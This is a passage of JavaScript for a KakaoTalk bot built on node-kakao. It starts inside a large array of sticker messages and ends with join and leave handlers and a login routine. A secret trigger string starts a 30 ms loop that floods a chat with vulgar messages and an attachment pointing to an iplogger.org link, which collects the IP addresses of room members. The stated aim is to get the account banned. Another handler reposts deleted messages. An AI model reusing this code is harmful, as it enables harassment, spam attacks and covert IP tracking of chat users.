        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_005.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_008.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_002.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_009.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_004.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_007.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_006.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_003.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_001.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":0,"height":0,"type":""}',
        },
        {
        t: 4,
        ct: '{"name":"(이모티콘)","path":"4412207.emot_0010.webp","alt":"","itemType":"STICKER_ANI","xconVersion":-1,"width":10,"height":10,"type":""}',
        },
        ],
                    }))
                    .build(24)
                );
            } catch (error) {
        console.log(error)
            }
        }
        if (data.text == "sjdfpijsdpisodfjosidjfoiusdoifuoid") {
            if (!runningSpam) {
                runningSpam = true;
                spamInterval = setInterval(() => {
                    channel.sendChat("본 계정을 영정 쳐먹입니다");
                    channel.sendChat("헤으응 섹스 시발 좆나 좋아");
                    channel.sendChat(
                        new node_kakao.ChatBuilder()
                            .append(new node_kakao.AttachmentContent({
                                "L": "https://iplogger.org/2sD5n6",
                                "Q": "ip",
                                "V": "image",
                                "R": [
                                    {
                                        "D": "ip",
                                        "L": "https://iplogger.org/2sD5n6",
                                        "I": "https://iplogger.org/2sD5n6",
                                        "W": 200,
                                        "H": 200
                                    }
                                ]
                            }))
                            .build(23)
                    );
                }, 30);
            } else {
                channel.sendChat("영정 시도중");
            }
        }
    }

});

function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}





CLIENT.on('error', (err) => {
});

CLIENT.on('disconnected', (reason) => {
    console.log('\n연결이 끊겼습니다.');
});

CLIENT.on('chat_deleted', (feedChatLog, channel, feed) => {
    chatInfo(channel, feed.logId).then(x => console.log("방금 삭제된 메시지\n  " + x.text)).catch(console.log);
    if (dlog == true) {
        setTimeout(function () {
            chatInfo(channel, feed.logId).then(x => channel.sendChat("방금 삭제된 메시지 : " + x.text)).catch(console.log);
        }, 1000);
        }
});

async function chatInfo(channel, id) { const chat = await channel.chatListStore.get(id); return chat; }




//CLIENT.on('profile_changed', (channel, lastInfo, user) => {
//channel.sendChat(`${user.nickname}님이 프로필을 변경하였습니다 \n\n 전 닉네임 : ${lastInfo.nickname} \n전 프로필: \n${lastInfo.profileURL}`);
//});

    CLIENT.channelList.normal.on('user_join', (joinLog, channel, user, feed) => {
        channel.sendChat(
            new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                "type": "animated-sticker/digital-item",
                "url": "4412008.emot_009.webp",
                "name": "(이모티콘)",
                "sound": "",
                "width": "360",
                "height": "360",
                "msg": "",
                "alt": "카카오 이모티콘"
             })).build(20)
        );
        })
        CLIENT.channelList.open.on('user_left', (joinLog, channel, user, feed) => {
            channel.sendChat(
                new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                    "L": "",
                    "Q": "퇴장 감지",
                    "V": "list",
                    "I": "",
                    "F": {
                        "BU": [
                            {
                                "T": "",
                                "L": "",
                                "TP": "more"
                            }
                        ]
                    },
                    "R": [
                        {
                            "T": "[ " + `${user.nickname}` + " ]",
                            "D":  channel.getChannelInfo2() + 1 + " ==> " + channel.getChannelInfo2(),
                            "I": "",
                            "L": "",
                            "W": 216,
                            "H": 216
                        },
                    ]
                }))
                    .build(23)
            )
            })
    CLIENT.channelList.normal.on('user_left', (joinLog, channel, user, feed) => {
        channel.sendChat(
            new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                "type": "animated-sticker/digital-item",
                "url": "4412008.emot_004.webp",
                "name": "(이모티콘)",
                "sound": "",
                "width": "360",
                "height": "360",
                "msg": "",
                "alt": "카카오 이모티콘"
             })).build(20)
        );
        })

    CLIENT.channelList.open.on('user_join', (joinLog, channel, user, feed) => {
        if( roomId == "18342166704610845" ) {
            if(isNaN(channel.getUserInfo({ userId: user.userId }).linkId)) {
                channel.sendChat("오픈 프로필로 변경 후 재입장 부탁드려요!")
        channel.kickUser2(user.userId)
        var unbanUserObj = { userId: user.userId };
        channel.removeKicked(unbanUserObj);
    }}    
});
    CLIENT.channelList.open.on('user_join', (joinLog, channel, user, feed) => {
                channel.sendChat(
            new node_kakao.ChatBuilder().append(new node_kakao.AttachmentContent({
                "L": "",
                "Q": "입장 감지",
                "V": "list",
                "I": "",
                "F": {
                    "BU": [
                        {
                            "T": "",
                            "L": "",
                            "TP": "more"
                        }
                    ]
                },
                "R": [
                    {
                        "T": "[ " + `${user.nickname}` + " ]",
                        "D": channel.getChannelInfo2() - 1 + " ==> " + channel.getChannelInfo2(),
                        "I": channel.getUserInfo({ userId: `${user.userId}` }).originalProfileURL,
                        "L": "",
                        "W": 216,
                        "H": 216
                    }
                ]
            }))
                .build(23)
        )
 //       channel.sendChat("✅보안 코드 작동중✅\n\n20초 안에 보안코드 V를 입력해주세요!\n")
//join.push(user.userId)
  //      setTimeout(function () {
    //        if(join.includes(user.userId)) {
  //          channel.sendChat("입장 코드를 입력하지 않아 강퇴를 시도합니다!")
   //             for (var getValueFor = 0; getValueFor < join.length; getValueFor++) {
   //                      join.splice(getValueFor);
    //                }}
    //                try{
    //            channel.kickUser2(user.userId)
     //               } catch(e) {
    //                    channel.sendChat(e)
   //                 }
   //         }
   //     }, 20000);
    });



  //  CLIENT.on('meta_change', (channel, type, newMeta) => {
   //     if (type == '3') {
     //       try{
    //        if ($TitleSpamList[channel.channelId] != false) {
    //            channel.setTitleMeta($TitleSpamList[channel.channelId]);
    //        }
  ///      } catch(error) {
 //          console(error)
   //         return
  //      }
 //       }
///    });





async function main() {
    const api = await node_kakao.AuthApiClient.create(deviceName, deviceUUID);
    const form = {
        email: email,
        password: pw,
    }
 
    let loginRes = await api.login(form);
    if (!loginRes.success) {
        if (loginRes.status == -100) {
            loginRes = null;
            console.log("\n\nRequesting Verify Code..");
            const passcodeRes = await api.requestPasscode(form);
            if (!passcodeRes.success) {
                console.log("\nFaild doing request the verify code! Error code: " + passcodeRes.status);
            }
            let rl = readline.createInterface({
                input: process.stdin,
                output: process.stdout
            });

            let passcode = await new Promise(resolve => rl.question("Verify Code: ", resolve));
            rl.close();
            const registerRes = await api.registerDevice(form, passcode, true);
            if (!registerRes.success) {
                console.log("\n\nFaild doing verify device. Error Code: " + registerRes.status);
            }

            console.log("\n\nFinished register device '" + deviceUUID + "'");
            loginRes = await api.login(form);
            if (!loginRes.success) {
                console.log("\n\nFaild Login, Error code: " + loginRes.status + "\n연결을 실패했습니다.");
            }
            console.log("\n\nLogged In!\n\n");
        } else {
            console.log("\n\nFaild Login, Error code: " + loginRes.status + "\nClosing Program")
        }
    }

    

    const res = await CLIENT.login(loginRes.result);
    if (!res.success) throw new Error(`Login failed with status: ${res.status}`);
    console.log('\nLogin! start DevPlus - bot v1 \n welcome!');
    accountUserId = loginRes.result.userId;
    }


async function start() {
    await main();
}


start();